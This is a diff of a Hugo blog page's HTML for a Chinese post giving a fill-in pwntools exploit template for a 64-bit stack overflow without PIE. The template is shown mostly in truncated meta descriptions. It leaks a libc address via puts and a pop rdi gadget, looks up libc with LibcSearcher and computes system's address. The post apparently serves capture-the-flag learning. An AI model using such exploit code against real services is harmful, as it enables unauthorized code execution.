@@ -1,23 +1,25 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>64位栈溢出rop模板(无PIE)</title>
-    <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="generator" content="Hugo 0.85.0" />
 
+  <title>64位栈溢出rop模板(无PIE) &middot; Ssd&#39;s Blog</title>
 
-<link rel="stylesheet" href="/css/bootstrap.min.css"/>
-<link rel="stylesheet" href="/css/layouts/main.css"/>
-<link rel="stylesheet" href="/css/navigators/navbar.css"/>
-<link rel="stylesheet" href="/css/plyr.css"/>
-<link rel="stylesheet" href="/css/flag-icon.min.css"/>
+  <meta name="description" content="" />
 
+  
 
-<link href="https://fonts.googleapis.com/css2?family=Muli:wght@300;400;500;600" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" />
+<meta itemprop="name" content="64位栈溢出rop模板(无PIE)">
+<meta itemprop="description" content="64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; #p = process(&#34;./&#34;) p = remote(&#34;&#34;,) elf = ELF(&#34;./&#34;) read_got = elf.got[&#39;read&#39;] puts_plt = elf.plt[&#39;puts&#39;] main_addr = pop_rdi = #************泄露got********* payload = b&#39;a&#39;*() &#43; p64(pop_rdi) &#43; p64(read_got) payload&#43;= p64(puts_plt) &#43; p64(main_addr) #payload = payload.ljust(200,&#39;b&#39;) p.sendline( payload) p.recvuntil(&#39;&#39;) read_addr = u64(p.recvuntil(&#39;\x0a&#39;)[:-1].ljust(8, &#39;\x00&#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&#34;read&#34;,read_addr) offset = read_addr - libc.dump(&#34;read&#34;) sys_addr = offset &#43; libc."><meta itemprop="datePublished" content="2021-07-12T17:35:19+08:00" />
+<meta itemprop="dateModified" content="2021-07-12T17:35:19+08:00" />
+<meta itemprop="wordCount" content="129">
+<meta itemprop="keywords" content="" />
 
-
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="64位栈溢出rop模板(无PIE)"/>
+<meta name="twitter:description" content="64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; #p = process(&#34;./&#34;) p = remote(&#34;&#34;,) elf = ELF(&#34;./&#34;) read_got = elf.got[&#39;read&#39;] puts_plt = elf.plt[&#39;puts&#39;] main_addr = pop_rdi = #************泄露got********* payload = b&#39;a&#39;*() &#43; p64(pop_rdi) &#43; p64(read_got) payload&#43;= p64(puts_plt) &#43; p64(main_addr) #payload = payload.ljust(200,&#39;b&#39;) p.sendline( payload) p.recvuntil(&#39;&#39;) read_addr = u64(p.recvuntil(&#39;\x0a&#39;)[:-1].ljust(8, &#39;\x00&#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&#34;read&#34;,read_addr) offset = read_addr - libc.dump(&#34;read&#34;) sys_addr = offset &#43; libc."/>
 
 
 <meta property="og:title" content="64位栈溢出rop模板(无PIE)" />
@@ -29,110 +31,170 @@
 
 
 
-    
-    
-<meta name="description" content="64位栈溢出rop模板(无PIE)" />
-<link
-  rel="stylesheet"
-  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/atom-one-dark.min.css"
-/>
-<link rel="stylesheet" href="/css/layouts/single.css"/>
-<link rel="stylesheet" href="/css/navigators/sidebar.css">
 
-<link rel="stylesheet" href="/css/style.css"/>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type":"Person",
+      "@id": "https://shaodongshi.github.io/#author",
+      "name":  null ,
+      "image": {
+        "@type":"ImageObject",
+        
+        
+      },
+      "description":  null 
+    },
+    {
+      "@type": "WebSite",
+      "@id": "https://shaodongshi.github.io/#website",
+      "url": "https://shaodongshi.github.io/",
+      "name": "Ssd's Blog",
+      "description":  null ,
+      "publisher": {
+        "@id": "https://shaodongshi.github.io/#author"
+      },
+      "inLanguage": "en-us"
+    },
+    {
+      "@type": "WebPage",
+      "@id": "https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/#webpage",
+      "url": "https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/",
+      "name": "64位栈溢出rop模板(无PIE)",
+      "isPartOf": {
+        "@id": "https://shaodongshi.github.io/#website"
+      },
+      "about": {
+         "@id": "https://shaodongshi.github.io/#author"
+      },
+      "datePublished": "2021-07-12T17:35:19+08:00",
+      "dateModified": "2021-07-12T17:35:19+08:00",
+      "description": "64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./\u0026#34;) p = remote(\u0026#34;\u0026#34;,) elf = ELF(\u0026#34;./\u0026#34;) read_got = elf.got[\u0026#39;read\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] main_addr = pop_rdi = #************泄露got********* payload = b\u0026#39;a\u0026#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,\u0026#39;b\u0026#39;) p.sendline( payload) p.recvuntil(\u0026#39;\u0026#39;) read_addr = u64(p.recvuntil(\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8, \u0026#39;\\x00\u0026#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(\u0026#34;read\u0026#34;,read_addr) offset = read_addr - libc.dump(\u0026#34;read\u0026#34;) sys_addr = offset + libc.",
+      "inLanguage": "en-us",
+      "potentialAction": [
+        {
+          "@type": "ReadAction",
+          "target": [
+            "https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/"
+          ]
+        }
+      ]
+    },
+    {
+      "@type": "Article",
+      "isPartOf": {
+        "@id": "https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/#webpage"
+      },
+      "mainEntityOfPage": {
+        "@id": "https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/#webpage"
+      },
+      "headline": "64位栈溢出rop模板(无PIE)",
+      "datePublished": "2021-07-12T17:35:19+08:00",
+      "dateModified": "2021-07-12T17:35:19+08:00",
+      "publisher": {
+        "@id": "https://shaodongshi.github.io/#author"
+      },
+      "keywords": [
+      ],
+      "articleSection": [
+      ],
+      "inLanguage": "en-us",
+      "author": {
+        "@type": "Person",
+        "name":  null 
+      },
+      "potentialAction": [
+        {
+          "@type": "CommentAction",
+          "name": "Comment",
+          "target": [
+            "https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/#comments"
+          ]
+        }
+      ]
+    }
+  ]
+}
+</script>
 
 
 
-    
-    
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/print.css"
+        media="print">
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/poole.css">
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/hyde.css">
+
+  
+
+
+  
+
+  <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700&display=swap">
+
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css"
+        integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk="
+        crossorigin="anonymous" />
+
+  <link rel="apple-touch-icon-precomposed"
+        sizes="144x144"
+        href="/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
   </head>
-
-  <body data-spy="scroll" data-target="#TableOfContents" data-offset="80">
-    <div class="container-fluid bg-dimmed wrapper">
-      
-      
-    
-
-
-
-
-
-
-
-
-
-
-
-
-<nav class="navbar navbar-expand-xl top-navbar final-navbar shadow">
+<body>
+  <aside class="sidebar">
   <div class="container">
-      <button class="navbar-toggler navbar-light" id="sidebar-toggler" type="button" onclick="toggleSidebar()">
-      <span class="navbar-toggler-icon"></span>
-    </button>
-    <a class="navbar-brand" href="/">
-      Ssd&#39;s Blog</a>
-    <button class="navbar-toggler navbar-light" id="toc-toggler" type="button" onclick="toggleTOC()">
-      <span class="navbar-toggler-icon"></span>
-    </button>
-
-    <div class="collapse navbar-collapse lang-selector" id="top-nav-items">
-      <ul class="navbar-nav ml-auto">
+    <div class="sidebar-about">
       
+        
+      
+
+      <h1>Ssd&#39;s Blog</h1>
+
+      
+    </div>
+
+    <nav>
+      <ul class="sidebar-nav">
+        <li>
+          <a href="https://shaodongshi.github.io/">Home</a>
+        </li>
+        
       </ul>
-    </div>
+    </nav>
+
+    <section class="social-icons">
+      
+    </section>
   </div>
+</aside>
+
+
+  <main class="content container">
+  <div class="post">
+  <h1 class="title">64位栈溢出rop模板(无PIE)</h1>
   
-  
-  
-</nav>
 
+  <div class="post-date">
+    <time datetime="2021-07-12T17:35:19&#43;0800">Jul 12, 2021</time> <span class="readtime">&middot; 1 min read</span>
+  </div>
 
-
-      
-      
-  <section class="sidebar-section" id="sidebar-section">
-    <div class="sidebar-holder">
-      <div class="sidebar" id="sidebar">
-        <form class="mx-auto" method="get" action="/search">
-          <input type="text" name="keyword" value="" placeholder="Search" data-search="" id="search-box" />
-        </form>
-        <div class="sidebar-tree">
-          <ul class="tree" id="tree">
-            <li id="list-heading"><a href="/posts" data-filter="all">Posts</a></li>
-            <div class="subtree">
-                
-
-            </div>
-          </ul>
-        </div>
-      </div>
-    </div>
-  </section>
-
-
-      
-      
-<section class="content-section" id="content-section">
-  <div class="content">
-    <div class="container p-0 read-area">
-      
-      <div class="hero-area col-sm-12" id="hero-area" style='background-image: url(https://shaodongshi.github.io/images/default-hero.jpg);'>
-      </div>
-
-      
-      <div class="page-content">
-        <div class="author-profile ml-auto align-self-lg-center">
-          <img class="rounded-circle" src='/images/default-avatar_hud3032af26cae4ad3a900356053a829cd_96315_120x120_fit_box_2.png' alt="Author Image">
-          <h5 class="author-name"></h5>
-          <p>July 12, 2021</p>
-        </div>
-
-        <div class="title">
-          <h1>64位栈溢出rop模板(无PIE)</h1>
-        </div>
-
-        <div class="post-content" id="post-content">
-          <h1 id="64位栈溢出rop模板无pie">64位栈溢出rop模板（无PIE）</h1>
+  <div>
+  <h1 id="64位栈溢出rop模板无pie">64位栈溢出rop模板（无PIE）</h1>
 <h2 id="exp模板">exp模板</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!usr/bin/env python</span>
 <span style="color:#75715e">#coding=utf-8</span>
@@ -182,191 +244,71 @@ p<span style="color:#f92672">.</span>interactive()
 <h2 id="64位传参">64位传参</h2>
 <p>对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。</p>
 
-        </div>
+  </div>
 
-        
-        
-          <div class="btn-improve-page">
-              <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/posts%5c64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29.md" title="Improve this page" target="_blank" rel="noopener">
-                <i class="fas fa-code-branch"></i>
-                Improve this page
-              </a>
-          </div>
-        
-
-        
-      <hr />
-        
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="row next-prev-navigator">
   
-  
+
+
+  <div class="share-buttons">
+  <a class="twitter-share-button"
+     href="#"
+     title="Share on Twitter"
+     data-url="https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/"
+     data-text="64位栈溢出rop模板(无PIE)"><i class="fab fa-twitter"></i></a>
+
+  <a class="linkedin-share-button"
+     href="#"
+     title="Share on LinkedIn"
+     data-url="https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/"
+     data-text="64位栈溢出rop模板(无PIE)"><i class="fab fa-linkedin-in"></i></a>
+
+  <a class="facebook-share-button"
+     href="#"
+     title="Share on Facebook"
+     data-url="https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/"
+     data-text="64位栈溢出rop模板(无PIE)"><i class="fab fa-facebook"></i></a>
+
+  <a class="telegram-share-button"
+     href="#"
+     title="Share on Telegram"
+     data-url="https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/"
+     data-text="64位栈溢出rop模板(无PIE)"><i class="fab fa-telegram"></i></a>
+
+  <a class="pinterest-share-button"
+     href="#"
+     title="Share on Pinterest"
+     data-url="https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/"
+     data-text="64位栈溢出rop模板(无PIE)"><i class="fab fa-pinterest"></i></a>
 </div>
 
-      <hr />
+
+  
+</div>
+  </main>
+
+  <footer>
+  <div>
+    <p>
+      &copy;  2021
+
       
+
       
-      </div>
-    </div>
+    </p>
   </div>
-  
-  <a id="scroll-to-top" class="btn"><i class="fas fa-chevron-circle-up"></i></a>
-  
-</section>
+</footer>
 
 
-      
-      
-  <section class="toc-section" id="toc-section">
-    
-    <div class="toc-holder">
-      <h5 class="text-center pl-3">Table of Contents</h5>
-      <hr>
-      <div class="toc">
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#exp模板">exp模板</a></li>
-    <li><a href="#ropgadget">ROPgadget</a></li>
-    <li><a href="#64位传参">64位传参</a></li>
-  </ul>
-</nav>
-      </div>
-    </div>
-    
-  </section>
-
-    </div>
-
-    
-    
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js"
+          integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0="
+          crossorigin="anonymous"></script>
 
 
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/soho.js"></script>
 
-
-
-
-
-
-
-  
-    
-  
-
-
-
-  
   
 
   
-  
-
-  
-  
-
-
-  
-  
-  
-
-  
-  
-  
-
-  
-  
-  
-    
-  
-  
-
-  
-  
-  
-
-  <footer class="container-fluid text-center align-content-center footer pb-2">
-    <div class="container pt-5">
-      <div class="row text-left">
-        
-        <div class="col-md-4 col-sm-12">
-          <h5>Navigation</h5>
-          
-        </div>
-        
-        
-        
-        
-          
-          <div class="col-md-4 col-sm-12">
-            <p>Stay up to date with email notification</p>
-            
-             
-              <form>
-                <div class="form-group">
-                  <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email"/>
-                  <small id="emailHelp" class="form-text text-muted">By entering your email address, you agree to receive the newsletter of this website.</small>
-                </div>
-                <button type="submit" class="btn btn-info">Submit</button>
-              </form>
-            
-          </div>
-        
-      </div>
-    </div>
-    
-    
-    <hr />
-    <div class="container">
-      <div class="row text-left">
-        <div class="col-md-4">
-          <a id="theme" href="https://github.com/hossainemruz/toha" target="_blank" rel="noopener">
-            <img src="/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_2.png" alt="Toha Theme Logo">
-            Toha
-          </a>
-        </div>
-        <div class="col-md-4 text-center">© 2021 Copyright.</div>
-        <div class="col-md-4 text-right">
-          <a id="hugo" href="https://gohugo.io/" target="_blank" rel="noopener">Powered by
-          <img
-            src="/images/hugo-logo.svg"
-            alt="Hugo Logo"
-            height="18"
-          />
-          </a>
-        </div>
-      </div>
-    </div>
-    
-  </footer>
-
-
-    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
-<script type="text/javascript" src="/js/popper.min.js"></script>
-<script type="text/javascript" src="/js/bootstrap.min.js"></script>
-
-<script type="text/javascript" src="/js/navbar.js"></script>
-<script type="text/javascript" src="/js/plyr.js"></script>
-<script type="text/javascript" src="/js/main.js"></script>
-
-
-    
-    
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js"></script>
-<script src="/js/single.js"></script>
-<script>
-  hljs.initHighlightingOnLoad();
-</script>
-
-
-  </body>
+</body>
 </html>
